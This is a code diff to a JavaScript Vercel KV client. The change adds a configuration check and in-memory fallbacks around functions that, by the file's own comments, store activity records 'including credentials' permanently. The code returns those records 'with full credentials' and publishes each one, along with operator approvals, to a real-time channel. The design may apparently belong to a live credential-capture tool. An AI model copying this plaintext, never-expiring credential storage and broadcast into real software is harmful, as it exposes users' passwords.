@@ -1,12 +1,23 @@
 // Vercel KV client wrapper
 // Stores all activities including credentials permanently
 
+// Helper function to check if KV is actually usable
+function isKVAvailable() {
+  return process.env.KV_REST_API_URL && process.env.KV_REST_API_TOKEN;
+}
+
 let kv;
 try {
   kv = require('@vercel/kv').kv;
-  console.log('[kv-client] ✅ Vercel KV initialized successfully');
+  // Only log success if KV is actually configured
+  if (isKVAvailable()) {
+    console.log('[kv-client] ✅ Vercel KV initialized successfully');
+  } else {
+    console.log('[kv-client] ⚠️ Vercel KV package loaded but not configured, using in-memory fallback');
+    kv = null;
+  }
 } catch (error) {
-  console.warn('[kv-client] ⚠️ Vercel KV not available, using in-memory fallback');
+  console.log('[kv-client] ⚠️ Vercel KV not available, using in-memory fallback');
   kv = null;
 }
 
@@ -36,24 +47,30 @@ export async function publishActivity(activity) {
       hasPassword: activity.hasPassword || false
     };
     
-    if (kv) {
-      // Store full activity permanently (no TTL)
-      await kv.set(
-        `${ACTIVITY_STORAGE_PREFIX}${activity.id}`,
-        JSON.stringify(fullActivity)
-      );
-      
-      // Add to activities list (for retrieval)
-      await kv.lpush(ACTIVITIES_LIST_KEY, activity.id);
-      // Keep only last 1000 activities in list
-      await kv.ltrim(ACTIVITIES_LIST_KEY, 0, 999);
-      console.log(`[kv-client] Stored activity ${activity.id} with userId: ${activity.userId}`);
-      
-      // Publish to channel for real-time subscribers
-      await kv.publish(ACTIVITY_CHANNEL, JSON.stringify({
-        type: 'activity',
-        data: fullActivity
-      }));
+    if (kv && isKVAvailable()) {
+      try {
+        // Store full activity permanently (no TTL)
+        await kv.set(
+          `${ACTIVITY_STORAGE_PREFIX}${activity.id}`,
+          JSON.stringify(fullActivity)
+        );
+        
+        // Add to activities list (for retrieval)
+        await kv.lpush(ACTIVITIES_LIST_KEY, activity.id);
+        // Keep only last 1000 activities in list
+        await kv.ltrim(ACTIVITIES_LIST_KEY, 0, 999);
+        console.log(`[kv-client] Stored activity ${activity.id} with userId: ${activity.userId}`);
+        
+        // Publish to channel for real-time subscribers
+        await kv.publish(ACTIVITY_CHANNEL, JSON.stringify({
+          type: 'activity',
+          data: fullActivity
+        }));
+      } catch (kvError) {
+        // If KV fails, fall back to memory
+        console.warn('[kv-client] KV operation failed, falling back to memory:', kvError.message);
+        throw kvError; // Re-throw to trigger fallback
+      }
     } else {
       // Fallback: store in memory (keep all, no limit)
       memoryStore.activities.unshift(fullActivity);
@@ -86,22 +103,28 @@ export async function setApproval(activityId, approval) {
   };
   
   try {
-    if (kv) {
-      // Store approval with 10 minute TTL
-      await kv.setex(
-        `${APPROVAL_PREFIX}${activityId}`,
-        600, // 10 minutes
-        JSON.stringify(approvalData)
-      );
-      
-      // Publish approval event
-      const approvalMessage = {
-        type: 'approval',
-        activityId,
-        data: approvalData
-      };
-      await kv.publish(ACTIVITY_CHANNEL, JSON.stringify(approvalMessage));
-      console.log(`[kv-client] Published approval to channel '${ACTIVITY_CHANNEL}':`, approvalMessage);
+    if (kv && isKVAvailable()) {
+      try {
+        // Store approval with 10 minute TTL
+        await kv.setex(
+          `${APPROVAL_PREFIX}${activityId}`,
+          600, // 10 minutes
+          JSON.stringify(approvalData)
+        );
+        
+        // Publish approval event
+        const approvalMessage = {
+          type: 'approval',
+          activityId,
+          data: approvalData
+        };
+        await kv.publish(ACTIVITY_CHANNEL, JSON.stringify(approvalMessage));
+        console.log(`[kv-client] Published approval to channel '${ACTIVITY_CHANNEL}':`, approvalMessage);
+      } catch (kvError) {
+        // If KV fails, fall back to memory
+        console.warn('[kv-client] KV operation failed, falling back to memory:', kvError.message);
+        throw kvError; // Re-throw to trigger fallback
+      }
     } else {
       // Fallback: store in memory
       memoryStore.approvals[activityId] = approvalData;
@@ -152,15 +175,27 @@ export async function setApproval(activityId, approval) {
 // Get approval status
 export async function getApproval(activityId) {
   try {
-    if (kv) {
-      const data = await kv.get(`${APPROVAL_PREFIX}${activityId}`);
-      return data ? JSON.parse(data) : null;
+    if (kv && isKVAvailable()) {
+      try {
+        const data = await kv.get(`${APPROVAL_PREFIX}${activityId}`);
+        return data ? JSON.parse(data) : null;
+      } catch (kvError) {
+        // Suppress "missing env vars" error - it's expected when KV isn't configured
+        if (!kvError.message.includes('Missing required environment variables')) {
+          console.warn('[kv-client] KV get failed, falling back to memory:', kvError.message);
+        }
+        // Fallback to memory
+        return memoryStore.approvals[activityId] || null;
+      }
     } else {
       // Fallback: get from memory
       return memoryStore.approvals[activityId] || null;
     }
   } catch (error) {
-    console.error('Error getting approval:', error);
+    // Suppress "missing env vars" error - it's expected when KV isn't configured
+    if (!error.message.includes('Missing required environment variables')) {
+      console.error('[kv-client] Error getting approval:', error);
+    }
     // Fallback to memory on error
     return memoryStore.approvals[activityId] || null;
   }
@@ -169,32 +204,38 @@ export async function getApproval(activityId) {
 // Get recent activities with full credentials (for initial load)
 export async function getRecentActivities() {
   try {
-    if (kv) {
-      console.log('[kv-client] 📦 Fetching from Vercel KV...');
-      // Get last 500 activity IDs from list (more history)
-      const activityIds = await kv.lrange(ACTIVITIES_LIST_KEY, 0, 499);
-      console.log(`[kv-client] Retrieved ${activityIds.length} activity IDs from KV`);
-      const activities = [];
-      
-      // Fetch full activities
-      for (const activityId of activityIds) {
-        try {
-          const data = await kv.get(`${ACTIVITY_STORAGE_PREFIX}${activityId}`);
-          if (data) {
-            const activity = JSON.parse(data);
-            activities.push(activity);
+    if (kv && isKVAvailable()) {
+      try {
+        console.log('[kv-client] 📦 Fetching from Vercel KV...');
+        // Get last 500 activity IDs from list (more history)
+        const activityIds = await kv.lrange(ACTIVITIES_LIST_KEY, 0, 499);
+        console.log(`[kv-client] Retrieved ${activityIds.length} activity IDs from KV`);
+        const activities = [];
+        
+        // Fetch full activities
+        for (const activityId of activityIds) {
+          try {
+            const data = await kv.get(`${ACTIVITY_STORAGE_PREFIX}${activityId}`);
+            if (data) {
+              const activity = JSON.parse(data);
+              activities.push(activity);
+            }
+          } catch (err) {
+            console.error(`[kv-client] Error fetching activity ${activityId}:`, err);
           }
-        } catch (err) {
-          console.error(`[kv-client] Error fetching activity ${activityId}:`, err);
         }
+        
+        console.log(`[kv-client] ✅ Successfully loaded ${activities.length} activities from KV`);
+        
+        // Sort by timestamp descending
+        return activities.sort((a, b) => 
+          new Date(b.timestamp) - new Date(a.timestamp)
+        );
+      } catch (kvError) {
+        // If KV fails, fall back to memory
+        console.warn('[kv-client] KV operation failed, falling back to memory:', kvError.message);
+        throw kvError; // Re-throw to trigger fallback
       }
-      
-      console.log(`[kv-client] ✅ Successfully loaded ${activities.length} activities from KV`);
-      
-      // Sort by timestamp descending
-      return activities.sort((a, b) => 
-        new Date(b.timestamp) - new Date(a.timestamp)
-      );
     } else {
       // Fallback: return from memory (all activities)
       console.log(`[kv-client] 💾 Using memory fallback, returning ${memoryStore.activities.length} activities`);
